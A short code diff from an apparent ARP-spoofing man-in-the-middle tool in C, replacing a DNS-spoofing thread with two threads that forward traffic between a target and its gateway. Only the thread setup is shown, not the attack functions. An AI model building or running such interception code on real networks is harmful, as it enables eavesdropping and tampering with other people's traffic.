@@ -90,7 +90,7 @@ int main(int argc, char** argv[]){
     fprintf(stderr, "Target MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *target_mac, *(target_mac+1), *(target_mac+2), *(target_mac+3), *(target_mac+4), *(target_mac+5));
     fprintf(stderr, "Gateway MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *gateway_mac, *(gateway_mac+1), *(gateway_mac+2), *(gateway_mac+3), *(gateway_mac+4), *(gateway_mac+5));
     //start arp attack
-    pthread_t arpspoof, dnsspoof;
+    pthread_t arpspoof, tar_to_gtw, gtw_to_tar;
  
     attacking_args_t *args = (attacking_args_t*) malloc(sizeof(attacking_args_t));
 
@@ -106,10 +106,12 @@ int main(int argc, char** argv[]){
 
     
     pthread_create(&arpspoof, NULL, arp_spoofing, (void*) args);
-    pthread_create(&dnsspoof, NULL, dns_spoofing, (void*) args);
+    pthread_create(&tar_to_gtw, NULL, target_to_gateway, (void*) args);
+    pthread_create(&gtw_to_tar, NULL, gateway_to_target, (void*) args);
     pthread_join(arpspoof, NULL);
-    pthread_join(dnsspoof, NULL);
+    pthread_join(tar_to_gtw, NULL);
+    pthread_join(gtw_to_tar, NULL);
 
     free(args);
-    
+
 }
